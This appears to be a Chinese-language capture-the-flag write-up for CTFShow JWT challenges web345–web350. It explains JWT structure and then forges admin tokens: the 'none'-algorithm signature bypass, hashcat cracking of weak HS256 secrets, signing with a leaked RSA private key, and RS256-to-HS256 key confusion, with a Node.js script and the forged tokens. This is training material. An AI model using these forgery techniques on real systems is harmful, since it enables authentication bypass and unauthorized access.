## jwt(AK)

### web345

启动靶机，进入环境。一个熟悉的where is flag?

F12查看元素发现/admin的提示，说明需要伪造身份。

先学习jwt的知识

> JWT的优缺点
> 基于session和基于jwt的方式的主要区别就是用户的状态保存的位置，session是保存在服务端的，而jwt是保存在客户端的。自身包含了认证鉴权所需要的所有信息，服务器端无需对其存储，从而给服务器减少了存储开销。
>
> 1可扩展性好，
>
> 2无状态jwt不在服务端存储任何状态
>
> JWT长什么样？
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
>
> 看着与BASE64加密很像，但其中的+，/分别会被替换为减号（-）和下划线（_）
>
> “=”等号是被去掉的
>
> JWT的过程
> 1服务端根据用户登录信息，将信息生成token，返给客户端
>
> 2客户端收到服务端返回的token，存储在cookie中
>
> 3客户端携带token信息发送到服务端 ,以放在http请求头信息中，如：Authorization字段里面
>
> 4服务端检验token的合法性，如何合法，则成功，完成相应的响应
>
> jwt的结构
> jwt由三部分组成，每部分之间用.分隔，分别为
> 1、Header
> 2、Payload
> 3、Signature
>
> Header
> header示例如下：
> {
> “alg”: “HS256”,
> “typ”: “JWT”
> }
>
> header由两部分组成，typ代表令牌的类型，也就是jwt，alg代表签名算法，常用的有hs256和rs256，分别代表HMAC和RSA
>
> Payload
> iss: jwt签发者
> sub: jwt所面向的用户
> aud: 接收jwt的一方
> exp: jwt的过期时间，这个过期时间必须要大于签发时间
> nbf: 定义在什么时间之前，该jwt都是不可用的.
> iat: jwt的签发时间
> jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。
> {
>
> "sub": "1234567890",
>
> "name": "John Doe",
>
> "iat": 1516239022
>
> }
>
> Signature
> 要创建签名部分，必须获取已编码的标头（header）、编码的有效负载（payload）、密钥、header中指定的算法，并对其进行签名。
>
> 签名用于验证信息在传输过程中是否被篡改，并且在使用私钥签名令牌的情况下，它还可以验证 JWT 的发送者是否正确。
>
> 由三部分组成
>
> header
>
> payload
>
> secret
>
> 这个部分需要base64url后的header和base64url后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。
>
> var encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);
>
> var signature = HMACSHA256(encodedString, 'secret');
>
> 注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。

直接bp抓包，找到Token 放在jwt.io上面改，注意是/admin/

![](F:/CTFShow-Web/Web入门/jwt/web345/抓取Cookie.png)

获得了以下信息：

```
{
  "alg": "None",
  "typ": "jwt"
}
```

alg为None算法，无签名认证

下面构造payload：

```
[
  {
    "iss": "admin",
    "iat": 1696317561,
    "exp": 1696324761,
    "nbf": 1696317561,
    "sub": "user",
    "jti": "54faa4bd3108499bee219367c90bc09d"
  }
]
```

开始转换

```
eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTYzMTc1NjEsImV4cCI6MTY5NjMyNDc2MSwibmJmIjoxNjk2MzE3NTYxLCJzdWIiOiJhZG1pbiIsImp0aSI6IjU0ZmFhNGJkMzEwODQ5OWJlZTIxOTM2N2M5MGJjMDlkIn1d.
```

由于无签名认证，只取前面的部分。

获得flag。

![](F:/CTFShow-Web/Web入门/jwt/web345/flag.png)



### web346

启动靶机，进入环境。一个熟悉的where is flag?

然后又是/admin，抓包

得到了Cookie:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMDE5NiwiZXhwIjoxNjk2MzI3Mzk2LCJuYmYiOjE2OTYzMjAxOTYsInN1YiI6InVzZXIiLCJqdGkiOiI1ZmMwYWQwMWFkZTgzNDBmNGM2ODRiMzkyMDk5NjZhOCJ9.K4uexoNrg9Yw6bxg2e3GcoJTXvwXYC5HLQat0PjGzdw
```

![](F:/CTFShow-Web/Web入门/jwt/web346/Cookie检查.png)

HS256&Invalid Signature

使用None算法绕过签名，将alg更改为none。

构造payload：(此处必须使用脚本)

```
eyJhbGciOiAiTm9uZSIsInR5cCI6ICJKV1QifQ.eyJpc3MiOiAiYWRtaW4iLCJpYXQiOiAxNjk2MzIwMTk2LCJleHAiOiAxNjk2MzI3Mzk2LCJuYmYiOiAxNjk2MzIwMTk2LCJzdWIiOiAiYWRtaW4iLCJqdGkiOiAiNWZjMGFkMDFhZGU4MzQwZjRjNjg0YjM5MjA5OTY2YTgifSA.
```

重放，得到flag



### web347

启动靶机，进入环境。一个熟悉的where is flag?

然后又是/admin，抓包

Cookie:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMTQ4OCwiZXhwIjoxNjk2MzI4Njg4LCJuYmYiOjE2OTYzMjE0ODgsInN1YiI6InVzZXIiLCJqdGkiOiJmZjczMGQ5Yjc5YTEyZWY5NTI2OTgyZjYxZDkxYjRiZCJ9.R_0R8ShiZNQNNle6H4s_prdGLLNJjbYm5YyenY7CJww
```

分析后得到HS256&Need Signature,所以得爆破密码。

```
hashcat -a 0 -m 16500
```

密钥为 123456

payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMTQ4OCwiZXhwIjoxNjk2MzI4Njg4LCJuYmYiOjE2OTYzMjE0ODgsInN1YiI6ImFkbWluIiwianRpIjoiZmY3MzBkOWI3OWExMmVmOTUyNjk4MmY2MWQ5MWI0YmQifQ.9F9km5a71C0Pt-R-4EXMnCI_ot6WHut1kmS4ZR7Lf1U
```

拿到flag



### web348

同web347，继续爆破，得到密码为aaab

payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMjQ1MiwiZXhwIjoxNjk2MzI5NjUyLCJuYmYiOjE2OTYzMjI0NTIsInN1YiI6ImFkbWluIiwianRpIjoiOGU0NDVlZTY4NzcyZmUzZjI1ZmFkNjllODE0MWZlOTcifQ.sjuE3NvuibTvFJa8p9HcGo_MZt5eaIxCm94RnbydWTg
```



### web349

附件：

```
/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
  res.cookie('auth',token);
  res.end('where is flag?');
  
});

router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key
	jwt.verify(auth, cert, function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin');
	  }
	});
});
```

需要公钥和私钥

访问/private.key /public.key 得到公钥密钥

public key

```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb
+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnX
YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA
bG1Naz58ibbtogeglQIDAQAB
-----END PUBLIC KEY-----
```



private key

```
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb
eni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8
IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB
AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK
frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX
h7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM
cdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi
ST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv
ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA
+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ
V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW
zawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV
x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==
-----END RSA PRIVATE KEY-----
```



导入得到jwt

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM
```

然后POST到根目录，拿到flag



### web350

```
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//routes/private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
 
  res.cookie('auth',token);
  res.end('where is flag?');
  
});
 
router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//routes/public.key');  // get public key
	jwt.verify(auth, cert,function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin'+err);
	  }
	});
});

```

哦，看来又有公钥和私钥，**然而这次只拿到了公钥。**

这里我们可以利用：将RS256算法改为HS256（非对称密码算法=>对称密码算法）

绕过服务端签名检测，从而构造JWT

解释：   

        HS256算法使用密钥为所有消息进行签名和验证。
    
        而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。

如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。

        由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。
    
        这样的话，后端代码使用RSA公钥+HS256算法进行签名验证

把原来的脚本修改一下

```
const jwt = require('jsonwebtoken');
var fs = require('fs');
var privateKey = fs.readFileSync('public.key');
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
console.log(token)
```

jwt payload:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2OTYzMzU0Njd9.VZuPjTj3neBAFdRAOGKWXmyugvAkws8Tm0s37UyQPug
```

VScode也有bug啊。

终于拿到flag了，环境坑我不浅。

恭喜AK！